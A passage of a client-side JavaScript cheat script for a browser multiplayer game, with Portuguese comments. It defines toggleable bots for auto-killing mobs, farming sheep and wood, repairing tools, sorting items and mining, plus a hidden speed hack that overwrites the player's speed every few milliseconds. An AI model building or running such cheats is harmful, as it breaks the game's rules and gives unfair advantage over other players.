                    return i;
                }
            }
        }
    }
}

async function xEffct() {
    if (!myself || game_state !== 2) return;
    if (xGoing[109] === true) return;

    // ← Mesma condição do bandage: sem mob e sem combate recente
    const temMob   = xTemp[13] !== undefined && xTemp[13] !== myself;
    const emCombate = xRecentCombat;
    if (temMob || emCombate) return;

    xGoing[109] = true;

    const amt = xGetCarawayAmt();
    if (amt >= 1) {
        for (let i = 0; i < Math.round(amt); i++) {
            if (xGetCarawayAmt() > 0) {
                if (xGetSlotByID(77) !== undefined) {
                    await xDoUseSlotByID(xGetSlotByID(77));
                    await xDelay(50);
                }
            }
        }
        await xDelay(1000);
    }

    xGoing[109] = false;
}

dsk.effct = { enabled: false };

dsk.setCmd('/effct', () => {
    dsk.effct.enabled = !dsk.effct.enabled;
    dsk.localMsg(`Auto Caraway: ${dsk.effct.enabled ? 'Ativado' : 'Desativado'}`, dsk.effct.enabled ? '#5f5' : '#f55');

    if (dsk.effct.enabled) {
        (async function loop() {
            while (dsk.effct.enabled) {
                if (game_state === 2) await xEffct();
                await xDelay(500);
            }
        })();
    } else {
        xGoing[109] = false;
    }
});

// ── AUTO KILL ─────────────────────────────────────────────────

function xGetMobByPos(x, y) {
  for (let i in mobs.items) {
    const mob = mobs.items[i];
    if (mob && mob.x === x && mob.y === y) return mob;
  }
  return undefined;
}

async function KillMobsNearMe() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;
  if (xGoing[120] === true) return;
  xGoing[120] = true;

  const originalDir = myself.dir;

  const adjacentes = [
    { x: myself.x,     y: myself.y - 1, dir: 0 }, // cima
    { x: myself.x,     y: myself.y + 1, dir: 2 }, // baixo
    { x: myself.x + 1, y: myself.y,     dir: 1 }, // direita
    { x: myself.x - 1, y: myself.y,     dir: 3 }, // esquerda
  ];

  for (const { x, y, dir } of adjacentes) {
    const mob = xGetMobByPos(x, y);
    if (!mob || mob === myself || xPlyrTest(mob)) continue;

    mobNearMe = true;

    // Seleciona o mob como alvo
    if (target.id !== mob.id) {
      target.id = mob.id;
      send({ type: 't', t: mob.id });
    }

    // Vira para o mob e ataca
    await xDoChangeDir(dir);
    await xDoKeyPress(6, 200);
    await xDelay(300);

    // Volta para a direção original
    if (myself.dir !== originalDir) {
      await xDoChangeDir(originalDir);
    }

    // Deseleciona o alvo
    target.id = me;

    xGoing[120] = false;
    return; // ataca 1 mob por tick
  }

  mobNearMe = false;
  xGoing[120] = false;
}

dsk.autokill = { enabled: false };

dsk.setCmd('/autokill', () => {
  dsk.autokill.enabled = !dsk.autokill.enabled;

  if (dsk.autokill.enabled) {
    dsk.localMsg('AutoKill: Ativado', '#5f5');
    (async function loop() {
      while (dsk.autokill.enabled) {
        await KillMobsNearMe();
        await xDelay(1500);
      }
    })();
  } else {
    xGoing[120] = false;
    target.id = me;
    mobNearMe = false;
    dsk.localMsg('AutoKill: Desativado', '#f55');
  }
});


// ── COLOR PICKER ──────────────────────────────────────────────

dsk.colorPicker = jv.Dialog.create(200, 220);
const cp = dsk.colorPicker;
cp.visible = false;

cp.header = jv.text('Color Picker', {
  font: '14px Verdana', fill: 0xFFD700, stroke: 0x555555, strokeThickness: 2,
});
cp.addChild(cp.header);
jv.center(cp.header);
jv.top(cp.header, 4);

cp.close = jv.Button.create(0, 0, 24, 'X', cp, 24);
jv.top(cp.close, 4); jv.right(cp.close, 4);
cp.close.on_click = () => (cp.visible = 0);

cp.move = jv.Button.create(0, 0, 24, '@', cp, 24);
jv.top(cp.move, 4); jv.right(cp.move, 28);

cp._px = 0; cp._py = 0;
window.addEventListener('mousemove', e => { cp._px = e.clientX; cp._py = e.clientY; });
window.addEventListener('touchmove', e => { cp._px = e.touches[0].clientX; cp._py = e.touches[0].clientY; });

dsk.on('postLoop', () => {
  if (!cp.move?.is_pressed) {
    cp.x = Math.max(0, Math.min(cp.x, jv.game_width  - cp.w));
    cp.y = Math.max(0, Math.min(cp.y, jv.game_height - cp.h));
    return;
  }
  const canvas = document.querySelector('canvas');
  const rect = canvas ? canvas.getBoundingClientRect() : { left:0, top:0, width:jv.game_width, height:jv.game_height };
  cp.x = (cp._px - rect.left) * (jv.game_width / rect.width)  - cp.w / 2;
  cp.y = (cp._py - rect.top)  * (jv.game_height / rect.height) - 12;
});

// ── Cores ─────────────────────────────────────────────────────

const cpColors = [
  { label: '● Rosa',     hex: 'ff4dff' },
  { label: '● Laranja',  hex: 'ff9900' },
  { label: '● Verde',    hex: '00FF00' },
  { label: '● Amarelo',  hex: 'FFFF00' },
  { label: '● Prata',    hex: 'C0C0C0' },
  { label: '● Ciano',    hex: '00FFFF' },
];

cpColors.forEach((c, i) => {
  const btn = jv.Button.create(20, 35 + i * 26, 160, c.label, cp, 22);
  btn.title.style.fill = parseInt(c.hex, 16); // ← btn.title
  btn.on_click = () => {
    _originalSend({ type: 'chat', data: `/color ${c.hex}` });
    dsk.localMsg(`Color: ${c.hex}`, `#${c.hex}`);
  };
});

// ── Comando ───────────────────────────────────────────────────

dsk.setCmd('/colorpicker', () => {
  cp.visible = !cp.visible;
  dsk.localMsg(`Color Picker: ${cp.visible ? 'Aberto' : 'Fechado'}`, cp.visible ? '#5f5' : '#f55');
});

// ── Menu ──────────────────────────────────────────────────────

dsk.sheep = { enabled: false };

async function SheepRun() {
  if (dskPaused || !myself || game_state !== 2) return;

  const totalGates = 22;
  const firstGateX = myself.x + 1; // começa na frente do personagem
  const gateY      = myself.y;
  
  // ← Começa no slot 0, troca para 1, 2... quando quebrar
  let sheepToolSlot = 0;
  
  async function checkAndSwapTool() {
    if (inv[0]?.equip !== 2) return; // não quebrou, tudo bem

    sheepToolSlot++;
    if (!inv[sheepToolSlot]?.sprite) {
      dsk.localMsg('Sheep: sem mais ferramentas!', '#f55');
      dsk.sheep.enabled = false;
      return;
    }

    dsk.localMsg(`Sheep: trocando para slot ${sheepToolSlot + 1}...`, '#ff0');
    await xDoSwapSlot(1, sheepToolSlot + 1); // traz pro slot 0
    await xDelay(400);
    await xDoUseSlot(0); // equipa
    await xDelay(500);
  }

  // Equipa item do slot 0
  if (inv[0]?.equip === 0) {
    await xDoUseSlot(0);
    await xDelay(500);
  }

  dsk.localMsg(`Sheep: iniciando 22 gates a partir de X=${firstGateX}`, '#0ff');

  for (let i = 0; i < totalGates; i++) {
    if (!dsk.sheep.enabled) return;

    const gateX   = firstGateX + i;
    const isFirst = i === 0;
    const isLast  = i === totalGates - 1;

    // Move até a gate
    await xDoMove(gateX, gateY);
    await xDelay(600);

    // Abre a gate (vira direita + ataca)
    await xDoChangeDir(1);
    await xDelay(300);
    await xDoKeyPress(6, 190);
    await xDelay(500);

    // Gates do meio: vira baixo, ataca ovelha 5x, volta pra direita
    if (!isFirst && !isLast) {
      await xDoChangeDir(2);
      await xDelay(400);
      for (let j = 0; j < 5; j++) {
        if (!dsk.sheep.enabled) return;
		await checkAndSwapTool(); // ← checa a cada batida
        await xDoKeyPress(6, 190);
        await xDelay(800);
      }
      await xDoChangeDir(0);
      await xDelay(400);
      for (let j = 0; j < 5; j++) {
        if (!dsk.sheep.enabled) return;
		await checkAndSwapTool(); // ← checa a cada batida
        await xDoKeyPress(6, 190);
        await xDelay(800);
      }
      await xDoChangeDir(1);
      await xDelay(500);
    }
  }

  // Fim: anda 1 para a direita
  await xDoMove(myself.x + 1, myself.y);
  await xDelay(500);
  await xDoMove(151, 289);
  await xDelay(3000);
  for (let j = 0; j < 19; j++) {
    if (!dsk.sheep.enabled) return;
	await xDoChangeDir(0);
	await xDelay(500);
    await xDoKeyPress(6, 180);
    await xDelay(800);
	await xDoMove(myself.x - 1, myself.y);
	await xDelay(800);
  }
  await xDoChangeDir(0);
  await xDelay(500);
  await xDoKeyPress(6, 180);
  await xDelay(800);
  await xDoMove(132, 283);
  await xDelay(5000);
  for (let j = 0; j < 19; j++) {
    if (!dsk.sheep.enabled) return;
	await xDoChangeDir(2);
	await xDelay(500);
    await xDoKeyPress(6, 180);
    await xDelay(800);
	await xDoMove(myself.x + 1, myself.y);
	await xDelay(800);
  }
  await xDoChangeDir(2);
  await xDelay(500);
  await xDoKeyPress(6, 180);
  await xDelay(800);
  await xDoMove(141, 283);
  await xDelay(5000);
  await xDoMove(130, 286);
  await xDelay(5000);
  await xDoDropByID(0, 984);
  await xDelay(400);
  await xDoDropByID(0, 984);
  await xDelay(400);
  await xDoUseSlotByID(xGetSlotByID(719));
  await xDelay(400);
  await xDoMove(myself.x, myself.y + 1);
  await xDelay(400);
  await xDoChangeDir(0);
  await xDelay(400);
  for (let j = 0; j < 9; j++) {
    if (!dsk.sheep.enabled) return;
    await xDoKeyPress(6, 180);
    await xDelay(800);
  }
  await xDoMove(myself.x, myself.y - 1);
  await xDelay(400);
  await xDoPickUp();
  await xDelay(400);
  await xDoPickUp();
  await xDelay(400);
  await xDoUseSlotByID(xGetSlotByID(984));
  await xDelay(400);
  await xDoChangeDir(1);
  await xDelay(400);
  await xDoPickUp();
  await xDelay(400);
  await xDoDropByID(0, 919);
  await xDelay(400);

  dsk.localMsg('Sheep: ciclo completo! Aguardando 20min...', '#5f5');
}

dsk.setCmd('/sheep', () => {
  dsk.sheep.enabled = !dsk.sheep.enabled;
  if (dsk.sheep.enabled) {
    dsk.localMsg('Sheep Bot: Ativado', '#5f5');
    (async function loop() {
      while (dsk.sheep.enabled) {
        await SheepRun();
        if (dsk.sheep.enabled) {
          // Countdown a cada minuto
          for (let min = 20; min > 0; min--) {
            if (!dsk.sheep.enabled) return;
            dsk.localMsg(`Sheep: próximo ciclo em ${min} min...`, '#ff0');
            await xDelay(60 * 1000);
          }
        }
      }
    })();
  } else {
    dsk.localMsg('Sheep Bot: Desativado', '#f55');
  }
});


// ── WOOD FARM BOT ─────────────────────────────────────────────
// Adaptado de FarmWood + RepairItemX (acao.push → async/await)
// Usa xGoing[118] para lock

dsk.wood = { enabled: false };

// ── Equivalente ao RepairItemX ────────────────────────────────
async function xRepairItemWood() {
  if (!myself || game_state !== 2) return;
  if (inv[0]?.equip !== 2) return;

  const kitSlot = xGetSlotByID(719); // Repair Kit sprite ID
  if (kitSlot === undefined) {
    dsk.localMsg('Wood: Sem Repair Kit!', '#f55');
    return;
  }

  const savedDir = myself.dir;
  const savedY   = myself.y;

  // drop → equipa kit
  await xDoDropSlot(1, 1);       // slot 1 (1-indexado = slot 0)
  await xDelay(350);
  await xDoUseSlotByID(kitSlot);
  await xDelay(350);

  if (savedDir === 1 || savedDir === 2) {
    // 'c' sobe, 'vb' vira baixo, repara, 'b' desce, pick
    await xDoMove(myself.x, savedY - 1);
    await xDelay(500);
    await xDoChangeDir(2);
    await xDelay(300);
    for (let i = 0; i < 6; i++) {
      await xDoKeyPress(6, 200);
      await xDelay(800);
    }
    await xDoMove(myself.x, savedY);
    await xDelay(500);
    await xDoPickUp();
    if (savedDir === 1) await xDoChangeDir(1); // 'vd'

  } else {
    // 'b' desce, 'vc' vira cima, repara, 'c' sobe, pick
    await xDoMove(myself.x, savedY + 1);
    await xDelay(500);
    await xDoChangeDir(0);
    await xDelay(300);
    for (let i = 0; i < 6; i++) {
      await xDoKeyPress(6, 200);
      await xDelay(800);
    }
    await xDoMove(myself.x, savedY);
    await xDelay(400);
    await xDoPickUp();
    if (savedDir === 3) await xDoChangeDir(3); // 've'
  }

  await xDelay(300);
  await xDoUseSlot(0); // re-equipa item do slot 0
  await xDelay(300);
}

async function xRepairItemX2Wood() {
  if (!myself || game_state !== 2) return;
  if (inv[0]?.equip !== 2) return;

  const kitSlot = xGetSlotByID(719);
  if (kitSlot === undefined) {
    dsk.localMsg('Wood: Sem Repair Kit (X2)!', '#f55');
    return;
  }

  const savedDir = myself.dir;
  const savedY   = myself.y;

  // drop item no tile atual → equipa kit
  await xDoDropSlot(1, 1);
  await xDelay(350);
  await xDoUseSlotByID(kitSlot);
  await xDelay(350);

  if (savedDir === 2) {
    // 'c' sobe, 'vb' face baixo, repara (item ficou abaixo), 'b' desce, pick
    await xDoMove(myself.x, savedY - 1);
    await xDelay(500);
    await xDoChangeDir(2);          // 'vb'
    await xDelay(300);
    for (let i = 0; i < 6; i++) {
      await xDoKeyPress(6, 200);
      await xDelay(500);
    }
    await xDoMove(myself.x, savedY);
    await xDelay(500);
    await xDoPickUp();
    // dir 2: sem virada no fim

  } else {
    // dir 1, 3 ou 0:
    // 'b' desce, 'vc' face cima, repara (item ficou acima), 'c' sobe, pick
    await xDoMove(myself.x, savedY + 1);
    await xDelay(500);
    await xDoChangeDir(0);          // 'vc'
    await xDelay(300);
    for (let i = 0; i < 6; i++) {
      await xDoKeyPress(6, 200);
      await xDelay(800);
    }
    await xDoMove(myself.x, savedY);
    await xDelay(500);
    await xDoPickUp();
    if (savedDir === 1) await xDoChangeDir(1); // 'vd' — volta pra porta
    if (savedDir === 3) await xDoChangeDir(3); // 've'
    // dir 0: sem virada
  }

  await xDelay(300);
  await xDoUseSlot(0);  // re-equipa item
  await xDelay(300);
}

// ── Equivalente ao FarmWood ───────────────────────────────────
async function FarmWood() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;
  if (xGoing[118] === true) return;
  xGoing[118] = true;

  // Semente adjacente na direção → recém plantada, aguarda
  const seedR = objects.items.find(el => el?.name?.includes('Seed') && el.x === myself.x + 1 && el.y === myself.y);
  const seedL = objects.items.find(el => el?.name?.includes('Seed') && el.x === myself.x - 1 && el.y === myself.y);
  if (seedR && myself.dir === 1) { xGoing[118] = false; return; }
  if (seedL && myself.dir === 3) { xGoing[118] = false; return; }

  // Item quebrado → repara (se estiver sobre gate, sai primeiro)
   if (inv[0]?.equip === 2) {
    const onGate = objects.items.find(el =>
      el?.name === 'Tribe Gate' && el.x === myself.x && el.y === myself.y
    );
    if (onGate) {
      await xDoMove(myself.x - 1, myself.y); // 'e' — sai da gate primeiro
      await xDelay(500);
	  await xDoChangeDir(1);
	  await xDelay(400);
      await xRepairItemX2Wood();             // ← X2: item cai fora da gate
    } else {
      await xRepairItemWood();               // ← X normal
    }
    xGoing[118] = false;
    return;
   }

  // Tribe Gate à direita → interage (abre/fecha)
  const gateRight = objects.items.find(el => el?.name === 'Tribe Gate' && el.x === myself.x + 1 && el.y === myself.y);
  if (gateRight) {
    await xDelay(400);
    await xDoChangeDir(1);   // 'vd'
	await xDelay(400);
    await xDoKeyPress(6, 200);
    await xDelay(200);
  }

  const pinecone = item_data.find(el => el?.n?.includes('Pinecone'));

  // ── Dir 1 → direita ──────────────────────────────────────────
  if (myself.dir === 1) {
    const treeR = objects.items.find(el => el &&
      (el.name.includes('Tree') || el.name.includes('Bush') || el.name.includes('Rock')) &&
      el.x === myself.x + 1 && el.y === myself.y
    );
    if (treeR) {
      await xDoKeyPress(6, 200); // 'atk'
    } else {
      await xDelay(200);
      await xDoMove(myself.x + 1, myself.y); // 'd'
	  await xDelay(400);
      await xDoPickUp();
	  await xDelay(300);
      if (pinecone) await xDoUseSlot(pinecone.slot);
    }
  }
  // ── Dir 3 → esquerda ─────────────────────────────────────────
  else if (myself.dir === 3) {
    const gateToRight = objects.items.find(el => el?.name === 'Tribe Gate' && el.x === myself.x + 1 && el.y === myself.y);
    if (gateToRight) {
      await xDelay(200);
      await xDoChangeDir(1); // 'vd'
    } else {
      const treeL = objects.items.find(el => el &&
        (el.name.includes('Tree') || el.name.includes('Bush') || el.name.includes('Rock')) &&
        el.x === myself.x - 1 && el.y === myself.y
      );
      if (treeL) {
        await xDoKeyPress(6, 200); // 'atk'
      } else {
        await xDelay(200);
        await xDoMove(myself.x - 1, myself.y); // 'e'
		await xDelay(400);
        await xDoPickUp();
		await xDelay(300);
        if (pinecone) await xDoUseSlot(pinecone.slot);
      }
    }
  }

  // Animal Gate à direita virado para direita → desce
  const animalGateR = objects.items.find(el => el?.name === 'Animal Gate' && el.x === myself.x + 1 && el.y === myself.y);
  if (animalGateR && myself.dir === 1) {
    await xDelay(200);
    await xDoChangeDir(2); // 'vb'
	await xDelay(200);
  }

  // ── Dir 2 → baixo ────────────────────────────────────────────
  if (myself.dir === 2) {
    const treeD = objects.items.find(el => el &&
      (el.name.includes('Tree') || el.name.includes('Bush') || el.name.includes('Rock')) &&
      el.x === myself.x && el.y === myself.y + 1
    );
    if (treeD) {
      await xDoKeyPress(6, 200); // 'atk'
      await xDelay(200);
    } else {
	  await xDoMove(myself.x, myself.y + 1); // 'b'
      await xDelay(400);
      await xDoPickUp();
	  await xDelay(300);
      if (pinecone) await xDoUseSlot(pinecone.slot);
      await xDoChangeDir(3); // 've' = virar esquerda
    }
  }

  // Tribe Gate à esquerda, virado esquerda → virada de corredor
  const gateLeft = objects.items.find(el => el?.name === 'Tribe Gate' && el.x === myself.x - 1 && el.y === myself.y);
  if (gateLeft && myself.dir === 3) {
    const wood = item_data.find(el => el?.n?.includes('Wood'));
    await xDelay(500);
    await xDoKeyPress(6, 200);                              // 'atk'
    await xDelay(500);
    await xDoPickUp(); // 'pick'
	await xDelay(500);
    if (wood) await xDoDropByID(0, 249);           // 'drop'
    await xDelay(500);
    await xDoChangeDir(0);                                   // 'vc' = virar cima
    await xDelay(500);
    await xDoKeyPress(6, 200);                              // 'atk' cima
    await xDelay(500);
    await xDoChangeDir(1);                                   // 'vd' = virar direita
  }

  xGoing[118] = false;
}

// ── Comando e loop ────────────────────────────────────────────
dsk.setCmd('/wood', () => {
  dsk.wood.enabled = !dsk.wood.enabled;

  if (dsk.wood.enabled) {
    dsk.localMsg('Wood Farm: Ativado', '#5f5');
    (async function loop() {
      while (dsk.wood.enabled) {
        await FarmWood();
        await xDelay(400);
      }
    })();
  } else {
    xGoing[118] = false;
    dsk.localMsg('Wood Farm: Desativado', '#f55');
  }
});



// ── Helpers internos ──────────────────────────────────────────

function retnum(str) {
  const match = str.match(/\((\d)\)/);
  return match ? parseInt(match[1]) : 0;
}

function whatChatHas(text) {
  for (let i in jv.chat_box.lines) {
    if (jv.chat_box.lines[i].text.indexOf(text) !== -1) {
      return jv.chat_box.lines[i].text;
    }
  }
  return '';
}

function xGetItemByPos(x, y) {
  for (let i in objects.items) {
    const obj = objects.items[i];
    if (obj && obj.can_pickup === 1 && obj.x === x && obj.y === y) {
      return obj;
    }
  }
  return undefined;
}

// checkPosition(n): retorna true se o pathfinder ainda está em movimento
// (impede ação enquanto o personagem não chegou)
function checkPosition(n) {
  return xMovingNow;
}


// ── Funções de transformação de runas ─────────────────────────

function sortTransformLetter(str) {
  let result = '';
  const matches = str.match(/\b(\w+)\((\d)\)/g) || [];
  for (const m of matches) {
    const parts = m.match(/\b(\w+)\((\d)\)/);
    result += parts[1].charAt(0).toUpperCase();
  }
  return result;
}

function sortTransformNumber(str) {
  const matches = str.match(/\b(\w+)\((\d)\)/g) || [];
  const count = matches.length;
  let sum = 0;
  for (const m of matches) {
    const parts = m.match(/\b(\w+)\((\d)\)/);
    sum += parseInt(parts[2]);
  }
  return count * 3 - sum;
}

function sortGeneratePermutationsLetters(str) {
  const results = [];
  function permute(s, start) {
    if (start === s.length) { results.push(s); return; }
    for (let i = start; i < s.length; i++) {
      const arr = s.split('');
      [arr[start], arr[i]] = [arr[i], arr[start]];
      permute(arr.join(''), start + 1);
    }
  }
  permute(str, 0);
  return results;
}

// ── Lógica principal ───────────────────────────────────────────

window.sortDoTrash = true;

async function SortFooders() {
  if (dskPaused) return;
  if (!myself || game_state !== 2) return;

  // Pegar item mais próximo nas posições 
  if (inv[0].sprite === undefined) {
    let closest = undefined;
    let closestDist = Infinity;

    for (let x = 113; x <= 126; x++) {
      for (let y = 290; y <= 291; y++) {
        const item = xGetItemByPos(x, y);
        if (item !== undefined) {
          const dist = Math.sqrt(Math.pow(myself.x - x, 2) + Math.pow(myself.y - y, 2));
          if (dist < closestDist) {
            closest = item;
            closestDist = dist;
          }
        }
      }
    }

    if (!closest) return;

    // Tenta chegar e pegar — até 6 tentativas
    xDoMove(closest.x, closest.y);
    for (let attempt = 0; attempt < 6; attempt++) {
      await xDelay(900);
      if (myself.still() && !checkPosition(50)) {
        xDoPickUp();
        await xDelay(700);
        xDoUseSlot(0);
        await xDelay(700);
        break;
      }
      await xDelay(700);
    }
  }

  // ── Processa chat com resultado do robe ───────────────────────
  if (xIfChatHas("You wear the Noble Jacket")) {
    const fullLine = whatChatHas("You wear the Noble Jacket");
    xDoClearChat("You wear the Noble Jacket");

    const defIdx = fullLine.indexOf("def");
    const runeStr = fullLine.substring(defIdx + 4);

    if (runeStr !== "") {
      sortDoTrash = false;

      const allCombos = [
        "A","S","H","G","R",
        "AS","AH","AG","AR","SH","SG","SR","HG","HR","GR",
        "ASH","ASG","ASR","AHG","AHR","AGR","SHG","SHR","SGR","HGR",
        "ASHG","ASHR","AHGR","ASGR","SHGR","ASHGR"
      ];

      const runeLetters = sortTransformLetter(runeStr);
      const runeNumber  = sortTransformNumber(runeStr);

      let targetX = 117, targetY = 300; // default: Trash

      for (const combo of allCombos) {
        if (sortGeneratePermutationsLetters(combo).includes(runeLetters)) {
          const n  = retnum(runeStr);
          const rn = runeNumber;

          switch (combo) {
            // ── Runas simples (A/S/H/G/R) por nível 1-5 ──────────
            case "A": targetX=112; targetY=292+n; break;
            case "S": targetX=113; targetY=292+n; break;
            case "H": targetX=114; targetY=292+n; break;
            case "G": targetX=115; targetY=292+n; break;
            case "R": targetX=116; targetY=292+n; break;

            // ── Combinações duplas (sem "1" e rn<=0) ──────────────
            case "AH": targetX=118; targetY=runeStr.indexOf("1")===-1&&rn<=0?293:300; break;
            case "AR": targetX=118; targetY=runeStr.indexOf("1")===-1&&rn<=0?294:300; break;
            case "SH": targetX=118; targetY=runeStr.indexOf("1")===-1&&rn<=0?295:300; break;
            case "SG": targetX=118; targetY=runeStr.indexOf("1")===-1&&rn<=0?296:300; break;
            case "SR": targetX=118; targetY=runeStr.indexOf("1")===-1&&rn<=0?297:300; break;
            case "HG": targetX=119; targetY=runeStr.indexOf("1")===-1&&rn<=0?293:300; break;
            case "HR": targetX=119; targetY=runeStr.indexOf("1")===-1&&rn<=0?294:300; break;
            case "GR": targetX=119; targetY=runeStr.indexOf("1")===-1&&rn<=0?295:300; break;

            // ── Combinações triplas/quádruplas (rn<=0) ────────────
            case "SHG":   targetX=119; targetY=rn<=0?296:300; break;
            case "SHR":   targetX=119; targetY=rn<=0?297:300; break;
            case "SGR":   targetX=120; targetY=rn<=0?293:300; break;
            case "HGR":   targetX=120; targetY=rn<=0?294:300; break;
            case "ASHG":  targetX=120; targetY=rn<=0?295:300; break;
            case "ASHR":  targetX=120; targetY=rn<=0?296:300; break;
            case "AHGR":  targetX=120; targetY=rn<=0?297:300; break;
            case "ASGR":  targetX=121; targetY=rn<=0?293:300; break;
            case "SHGR":  targetX=121; targetY=rn<=0?294:300; break;
            case "ASHGR": targetX=121; targetY=rn<=0?295:300; break;

            default: targetX=117; targetY=300; break;
          }
          break;
        }
      }

      xDoMove(targetX, targetY);

      // Tenta dropar — até 7 tentativas
      for (let attempt = 0; attempt < 7; attempt++) {
        await xDelay(1300);
        if (myself.still() && !checkPosition(50)) {
          await xDelay(850);
          xDoDropSlot(0, 1);
          await xDelay(800);
          if (dsk.sort.enabled) SortFooders();
          return;
        }
        await xDelay(800);
      }

    } else {
      // runeStr vazio → vai para o Trash
      xDoMove(117, 300);
      for (let attempt = 0; attempt < 8; attempt++) {
        await xDelay(1300);
        if (myself.still()) {
          await xDelay(850);
          xDoDropSlot(0, 1);
          await xDelay(800);
          if (dsk.sort.enabled) SortFooders();
          return;
        }
        await xDelay(800);
      }
    }

  } else {
    // Não tem mensagem do robe ainda — aguarda
    await xDelay(800);
    if (dsk.sort.enabled) SortFooders();
  }
}

// ── Objeto e comandos ──────────────────────────────────────────

dsk.sort = { enabled: false };

dsk.setCmd('/sort', () => {
  dsk.sort.enabled = !dsk.sort.enabled;

  if (dsk.sort.enabled) {
    sortDoTrash = true;
    dsk.localMsg('Sort Fooders: Ativado', '#5f5');
    SortFooders();
  } else {
    dsk.localMsg('Sort Fooders: Desativado', '#f55');
  }
});


// ── MINE BOT ──────────────────────────────────────────────────
dsk.mine = { enabled: false, targetName: undefined };
window.xMiningActive = false;

async function xMineNearby() {
  if (xMiningActive) return;
  if (dskPaused || !myself || game_state !== 2) return;

  const targetNames = ['Rock', 'Shiny Rock'];
  let mineTarget = undefined;

  for (let i in objects.items) {
    const obj = objects.items[i];
    if (!obj || obj.can_pickup !== 0) continue;
    if (!targetNames.includes(obj.name)) continue;

    const dist = xGetDistance(obj.x, obj.y, myself.x, myself.y);
    if (dist >= 6) continue;

    if (!mineTarget ||
        dist < xGetDistance(mineTarget.x, mineTarget.y, myself.x, myself.y)) {
      mineTarget = obj;
    }
  }

  if (!mineTarget) return;

  xMiningActive = true;

  dsk.follow.enabled = false;
  _originalSend({ type: 'chat', data: `/follow ${dsk.mine.targetName}` });
  await xDelay(500);

  const sides = [
    { x: mineTarget.x + 1, y: mineTarget.y,     dir: 3 },
    { x: mineTarget.x - 1, y: mineTarget.y,     dir: 1 },
    { x: mineTarget.x,     y: mineTarget.y + 1, dir: 0 },
    { x: mineTarget.x,     y: mineTarget.y - 1, dir: 2 },
  ];

  let bestSide = undefined;
  for (const side of sides) {
    await xGetCanMove(side.x, side.y);
    if (xCanMov) {
      if (!bestSide ||
          xGetDistance(side.x, side.y, myself.x, myself.y) <
          xGetDistance(bestSide.x, bestSide.y, myself.x, myself.y)) {
        bestSide = side;
      }
    }
  }

  if (!bestSide) {
    dsk.localMsg('Mine: sem lado acessível', '#f55');
    xMiningActive = false;
    dsk.follow.enabled = true;
    _originalSend({ type: 'chat', data: `/follow ${dsk.mine.targetName}` });
    return;
  }

  await xDelay(800);
  await xDoMove(bestSide.x, bestSide.y);
  await xDelay(5000);

  await xDoChangeDir(bestSide.dir);
  await xDelay(500);

  dsk.localMsg(`Mine: minerando ${mineTarget.name}`, '#0ff');
  xDoKeyDown(6);

  const tx = mineTarget.x;
  const ty = mineTarget.y;
  const tn = mineTarget.name;

  while (true) {
    await xDelay(500);
    if (dskPaused || !dsk.mine.enabled) break;
    var stillExists = false;
    for (var j in objects.items) {
      var o = objects.items[j];
      if (o && o.name === tn && o.x === tx && o.y === ty) {
        stillExists = true;
        break;
      }
    }
    if (!stillExists) break;
  }

  xDoKeyUp(6);
  await xDelay(500);

  if (dsk.mine.enabled) {
    dsk.follow.enabled = true;
    dsk.follow.targetName = dsk.mine.targetName;
    _originalSend({ type: 'chat', data: `/follow ${dsk.mine.targetName}` });
    dsk.localMsg(`Mine: concluído, seguindo ${dsk.mine.targetName}`, '#5f5');
  }

  xMiningActive = false;
}

dsk.setCmd('/mine', (args) => {
  // Se passou nome: /mine Mandoka → atualiza o alvo
  if (args && args.trim() !== '') {
    dsk.mine.targetName = args.trim();
  }

  // Se nunca definiu um nome, pede para definir
  if (!dsk.mine.targetName) {
    dsk.localMsg('Mine: defina um alvo! Ex: /mine Mandoka', '#f55');
    return;
  }

  dsk.mine.enabled = !dsk.mine.enabled;

  if (dsk.mine.enabled) {
    xMiningActive = false;
    dsk.follow.enabled = true;
    dsk.follow.targetName = dsk.mine.targetName;
    _originalSend({ type: 'chat', data: `/follow ${dsk.mine.targetName}` });
    dsk.localMsg(`Mine Bot: Ativado | Alvo: ${dsk.mine.targetName}`, '#5f5');

    (async function loop() {
      while (dsk.mine.enabled) {
        if (!xMiningActive) await xMineNearby();
        await xDelay(1000);
      }
    })();

  } else {
    xMiningActive = false;
    dsk.follow.enabled = false;
    xDoKeyUp(6);
    _originalSend({ type: 'chat', data: `/follow ${dsk.mine.targetName}` });
    dsk.localMsg('Mine Bot: Desativado', '#f55');
  }
});

var autoSpeedHack = false;
var speedHackInterval2 = null;
var botaoSpeedVisible = false;

jv.botaoMenu2 = jv.Button.create(713, 360, 20, 'SP', ui_container, 20);
jv.botaoMenu2.visible = false; // ← começa escondido

jv.botaoMenu2.on_click = function () {
    if (!autoSpeedHack) {
        autoSpeedHack = true;
        speedHackInterval2 = setInterval(() => {
            myself.cur_speed = 130;
            last_dest = 9e10;
        }, 5);
    } else {
        autoSpeedHack = false;
        clearInterval(speedHackInterval2);
        speedHackInterval2 = null;
    }
};

dsk.setCmd('/sp', () => {
    botaoSpeedVisible = !botaoSpeedVisible;
    jv.botaoMenu2.visible = botaoSpeedVisible;
    dsk.localMsg(`Speed Button: ${botaoSpeedVisible ? 'Visível' : 'Escondido'}`, botaoSpeedVisible ? '#5f5' : '#f55');
});

dsk.menu.items.push(
  { label: 'Mine Bot',      state: () => dsk.mine?.enabled,       toggle: () => dsk.commands['/mine'](dsk.mine?.targetName ?? '') },
  { label: 'Base Repair',   state: () => dsk.baseRepair?.enabled, toggle: () => dsk.commands['/baserepair']() },
  { label: 'Auto Explo',    state: () => dsk.explo?.enabled,      toggle: () => dsk.commands['/explo']()      },
  { label: 'Top Skill Calc',state: () => tscD?.visible,           toggle: () => dsk.commands['/topskill']()   },
  { label: 'Repair Bot',    state: () => dsk.repair?.enabled,     toggle: () => dsk.commands['/repair']()     },
  { label: 'AutoKill',      state: () => dsk.autokill?.enabled,   toggle: () => dsk.commands['/autokill']()   },
  { label: 'Auto Caraway',  state: () => dsk.effct?.enabled,      toggle: () => dsk.commands['/effct']()      },
  { label: 'Sheep Bot',     state: () => dsk.sheep?.enabled,      toggle: () => dsk.commands['/sheep']()      },
  { label: 'Wood Farm',     state: () => dsk.wood?.enabled,       toggle: () => dsk.commands['/wood']()       },
  { label: 'Zoom 1.5x',     state: () => dsk.zoom?.enabled,       toggle: () => dsk.commands['/zoom']()       },
  { label: 'Color Picker',  state: () => cp?.visible,             toggle: () => dsk.commands['/colorpicker']()},
  { label: 'Buy (via /buy N)', state: () => false,                toggle: () => dsk.localMsg('Use /buy <qtd> no chat', '#ff0') },
